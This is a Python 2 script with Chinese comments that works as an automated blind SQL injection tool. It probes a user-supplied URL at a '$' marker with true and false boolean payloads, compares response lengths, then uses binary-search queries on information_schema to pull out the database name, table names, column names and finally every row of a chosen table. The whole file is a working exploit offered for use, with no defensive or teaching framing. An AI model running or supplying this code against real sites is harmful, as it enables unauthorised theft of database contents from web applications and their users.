#!/usr/bin/python
#-*- coding: UTF-8 -*-

import httplib
import urllib

def sqlscan():
    while 1:
        ture=('+and+5=5',' and 2=2')#这里是判断有无注入的语句
        false=('+and+5=6',' and 2=3')

        url=raw_input("输入源url：")
        if url.find('http://')!= -1: #看有没有http://有的话删除
            url=url.lstrip('http://') #删除http://
        

        a=url.find('/') #找/分割主机和资源名
        print a
        host=url[:a] #/前的是主机名
        path=url[a:]   #后面是资源名
        

        conn=httplib.HTTPConnection(host,80) #与主机建立一个http连接

        in_p=path.find('$') #查找注入点的位置
        
        i=0
        len_x=0
        while (len_x<10)and(i<len(ture)):
            #path_ture=path[:in_p-1]+ture[i]+path[in_p:] #组合注入语句
            #path_false=path[:in_p-1]+false[i]+path[in_p:] #组合错误的注入语句
            path_ture=path.replace('$',urllib.quote(ture[i])) #用判断注入的语句替换$
            path_false=path.replace('$',urllib.quote(false[i]))
            
            conn=httplib.HTTPConnection(host,80)
            conn.request('GET',path_ture) #以get方式请求
            res_ture=conn.getresponse()  
            len_ture=len(res_ture.read()) #计算返回信息的长度
            print "len_ture:",len_ture
            #body_ture=res_ture.read()
            #print body_ture
            
            conn=httplib.HTTPConnection(host,80)
    
            conn.request('GET',path_false)#同上
            res_false=conn.getresponse()
            len_false=len(res_false.read())
            print "len_false:",len_false
            len_x=abs(len_ture-len_false)
            i+=1


            if len_x>10:
                s1= "$处存在sql注入漏洞"
                print s1.decode('utf-8')
                d=raw_input("是否尝试注入Y/N: ")
                if d=='N':
                    break
                elif d=='Y':
                    sqlin(host,path,conn,len_ture)
                
        if len_x<=10:
            s= "貌似没有sql注入漏洞"
            print s.decode('utf-8')
            continue
    
        
            


def sqlin(host,path,conn,len_ture):
    num=0
    
    while num < 50:
        sqli_database_len=' and length(database())>'+str(num)#组合注入语句，猜数据库名字长度，改进的话应该在这把注入语句                                                             #跟前面的判断注入语句关联
        path_sqli=path.replace('$',urllib.quote(sqli_database_len)) #组合新的path
        #print path_sqli
        conn.request('GET',path_sqli) #获取数据
        res=conn.getresponse() #获取数据
        res_len=len(res.read()) #获取数据长度
        diff=abs(len_ture-res_len) #对比长度
        #print diff
        if diff > 10: #条件长度差大于10即认为不同
            database_len=num
            print "数据库名长度：",database_len
            break
        
        num+=1


    '''
    num_1=1
    database_name=[]
    while num_1<=database_len:
        for i in range(33,127):
            sqli_database_name=' and ord(mid(database(),'+str(num_1)+',1))>'+str(i)
            path_sqli=path.replace('$',urllib.quote(sqli_database_name))
            conn.request('GET',path_sqli) #获取数据
            res=conn.getresponse() #获取数据
            res_len=len(res.read()) #获取数据长度
            diff=abs(len_ture-res_len) #对比长度
            if diff > 10: #条件长度差大于10即认为不同
                database_name.append(chr(i))
                break

        num_1+=1
        '''
    num_1=1
    database_name=[]
    while num_1<=database_len:#猜数据库名
        min_num=33
        max_num=127
        
        while 1:#二分法猜字段
            num_2=(min_num+max_num)/2
            sqli_database_name=' and ord(mid(database(),'+str(num_1)+',1))>'+str(num_2)
            path_sqli=path.replace('$',urllib.quote(sqli_database_name))
            conn.request('GET',path_sqli) #获取数据
            res=conn.getresponse() #获取数据
            res_len=len(res.read()) #获取数据长度
            diff=abs(len_ture-res_len) #对比长度
            if diff<10:
                min_num=num_2

            else:
                max_num=num_2


            if max_num-min_num==1:
                database_name.append(chr(max_num))
                break

            #print 'min_num:',min_num
            #print 'max_num:',max_num
        num_1+=1
            
            
        
    database_name_1=( ''.join(database_name))
    print "数据库名：",database_name_1

    num_3=0
    
    while num_3 < 100:
        sqli_database_len=' and (select count(table_name) from information_schema.tables where table_schema=database())>'+str(num_3)#组合注入语句，猜数据库表个数
        path_sqli=path.replace('$',urllib.quote(sqli_database_len)) #组合新的path
        #print path_sqli
        conn.request('GET',path_sqli) #获取数据
        res=conn.getresponse() #获取数据
        res_len=len(res.read()) #获取数据长度
        diff=abs(len_ture-res_len) #对比长度
        #print diff
        if diff > 10: #条件长度差大于10即认为不正确
            database_len=num_3
            print "数据库中表的个数：",database_len
            break
        
        num_3+=1
        
    #'''
    num_4=0
    while num_4<database_len:
        
        num_5=0
        while num_5<50:#猜解表名长度
            
            sqli_database_len=' and (select length(table_name) from information_schema.tables where table_schema=database() limit '+str(num_4)+',1)>'+str(num_5)#组合注入语句，猜数据库表个数
            path_sqli=path.replace('$',urllib.quote(sqli_database_len)) #组合新的path
            
            conn.request('GET',path_sqli) #获取数据
            res=conn.getresponse() #获取数据
            res_len=len(res.read()) #获取数据长度
            diff=abs(len_ture-res_len) #对比长度
            
            if diff > 10: #条件长度差小于10即认为正确
                table_NO=num_4+1
                table_len=num_5
                #print "数据库中第",table_NO,"个表的长度：",table_len
                break
            
            num_5+=1

        
        num_6=1
        table_name=[]
        tables=[]
        while num_6<=table_len:#猜解数据库表名
            min_num=33
            max_num=127
            
            while 1:#二分法猜字段，二分法比一个一个猜快很多
                num_7=(min_num+max_num)/2
                sqli_database_name=' and ord(mid((select table_name from information_schema.tables where table_schema=database() limit '+str(num_4)+',1),'+str(num_6)+',1))>'+str(num_7)
                path_sqli=path.replace('$',urllib.quote(sqli_database_name))
                conn.request('GET',path_sqli) #获取数据
                res=conn.getresponse() #获取数据
                res_len=len(res.read()) #获取数据长度
                diff=abs(len_ture-res_len) #对比长度
                if diff<10:
                    min_num=num_7

                else:
                    max_num=num_7


                if max_num-min_num==1:
                    table_name.append(chr(max_num))
                    break

                #print 'min_num:',min_num
                #print 'max_num:',max_num
            num_6+=1
            
            
        
        table_name_1=( ''.join(table_name))
        tables.append(table_name_1)
        
        print "数据库中第",table_NO,"个表的长度：",table_len," 表名：",table_name_1        
        
        num_4+=1
       

    while 1:
        table_name_2=raw_input("输入要查看的表名：") #根据上面猜解出来的表名来查看各个表的详细情况
    
        num_7=0
        column_num=0
        while num_7<100:#猜解表中有多少列,我猜应该不会超过100列吧，这里可以改
            
            sqli_database_len=' and (select count(column_name) from information_schema.columns where table_name="'+table_name_2+'")>'+str(num_7)
            #组合注入语句，表中列的个数，注意有的地方表名需要单引号‘’，在这里需要双引号“”
            path_sqli=path.replace('$',urllib.quote(sqli_database_len)) #组合新的path
            
            conn.request('GET',path_sqli) #获取数据
            res=conn.getresponse() #获取数据
            res_len=len(res.read()) #获取数据长度
            diff=abs(len_ture-res_len) #对比长度
            
            if diff > 10:#条件长度差小于10即认为正确
            
                column_num=num_7 #表中的列数
                #print column_num
                break
            num_7+=1
        num_8=0
        columns_name=[]
        while num_8<column_num:#猜解所有表名与长度 这里num_8不得大于上文的表名个数
            num_9=0
            while num_9<50:#猜列名长度
                sqli_database_len=' and (select length(column_name) from information_schema.columns where table_name="'+table_name_2+'" limit '+str(num_8)+',1)>'+str(num_9)
                #组合注入语句，表中列的个数，注意有的地方表名需要单引号‘’，在这里需要双引号“”
                path_sqli=path.replace('$',urllib.quote(sqli_database_len)) #组合新的path
            
                conn.request('GET',path_sqli) #获取数据
                res=conn.getresponse() #获取数据
                res_len=len(res.read()) #获取数据长度
                diff=abs(len_ture-res_len) #对比长度
            
                if diff > 10:#条件长度差小于10即认为正确
            
                    column_len=num_9 #这里就是列名的长度
                    #print column_len
                    break
                num_9+=1


            num_10=1
            column_name=[]
            while num_10<=column_len:#猜列名
                min_num=33
                max_num=127
        
                while 1:#二分法猜列名
                    num_2=(min_num+max_num)/2
                    sqli_database_name=' and ord(mid((select column_name from information_schema.columns where table_name="'+table_name_2+'" limit '+str(num_8)+',1),'+str(num_10)+',1))>'+str(num_2)
                    #print sqli_database_name
                    path_sqli=path.replace('$',urllib.quote(sqli_database_name))
                    conn.request('GET',path_sqli) #获取数据
                    res=conn.getresponse() #获取数据
                    res_len=len(res.read()) #获取数据长度
                    diff=abs(len_ture-res_len) #对比长度
                    if diff<10:
                        min_num=num_2

                    else:
                        max_num=num_2


                    if max_num-min_num==1:
                        column_name.append(chr(max_num))
                        break

                    #print 'min_num:',min_num
                    #print 'max_num:',max_num
                num_10+=1
            
            
        
            column_name_1=( ''.join(column_name))
            #print column_name_1
            columns_name.append(column_name_1)
            num_8+=1
        
        print "表名：",columns_name
    
        shujumax=0 #每列数据数量的最大值
        for i in columns_name:
            num_11=0
            while num_11<1000:

                sqli_database_len=' and (select count('+i+') from '+table_name_2+')>'+str(num_11)
                #组合注入语句，表中第一列数据的个数，注意有的地方表名需要单引号‘’，在这里需要双引号“”
                path_sqli=path.replace('$',urllib.quote(sqli_database_len)) #组合新的path
            
                conn.request('GET',path_sqli) #获取数据
                res=conn.getresponse() #获取数据
                res_len=len(res.read()) #获取数据长度
                diff=abs(len_ture-res_len) #对比长度
            
                if diff > 10:#条件长度差小于10即认为正确
            
                    column_shu=num_11 #这里就是列名的长度
                    if column_shu>shujumax:
                        shujumax=column_shu
                    
                    break
                num_11+=1

        #print "最大数量：",shujumax

            
        num_12=0
        while num_12<shujumax:
            shujuneirong_1hang=[]
            for i in columns_name:
                num_13=0
                while num_13<50:
            
                    sqli=' and (select length('+i+') from '+table_name_2+' limit '+str(num_12)+',1)>'+str(num_13)
                    #and (select length(id) from saiqu limit 0,1)>0
                    #组合注入语句，表中第一列数据的个数，注意有的地方表名需要单引号‘’，在这里需要双引号“”
                    path_sqli=path.replace('$',urllib.quote(sqli)) #组合新的path
            
                    conn.request('GET',path_sqli) #获取数据
                    res=conn.getresponse() #获取数据
                    res_len=len(res.read()) #获取数据长度
                    diff=abs(len_ture-res_len) #对比长度
            
                    if diff > 10:#条件长度差小于10即认为正确
            
                        shuju_len=num_13 #这里就是数据的长度
                        break
                    num_13+=1
                #print "这个数据的长度：",shuju_len

                num_14=1
                shujuneirong=[]
                while num_14<=shuju_len:#猜测数据的内容
                
                
                    min_num=33
                    max_num=127
        
                    while 1:#二分法猜列名
                        num_2=(min_num+max_num)/2
                        sqli_database_name=' and ord(mid((select '+i+' from '+table_name_2+' limit '+str(num_12)+',1),'+str(num_14)+',1))>'+str(num_2)
                    
                        path_sqli=path.replace('$',urllib.quote(sqli_database_name))
                        conn.request('GET',path_sqli) #获取数据
                        res=conn.getresponse() #获取数据
                        res_len=len(res.read()) #获取数据长度
                        diff=abs(len_ture-res_len) #对比长度
                        if diff<10:
                            min_num=num_2

                        else:
                            max_num=num_2


                        if max_num-min_num==1:
                            shujuneirong.append(chr(max_num))
                            break

                        #print 'min_num:',min_num
                        #print 'max_num:',max_num
                    num_14+=1
            
            
        
                shujuneirong_1=( ''.join(shujuneirong))
            
                shujuneirong_1hang.append(shujuneirong_1)

            print "内容：",shujuneirong_1hang
            num_12+=1
        
        
                
              
    
sqlscan()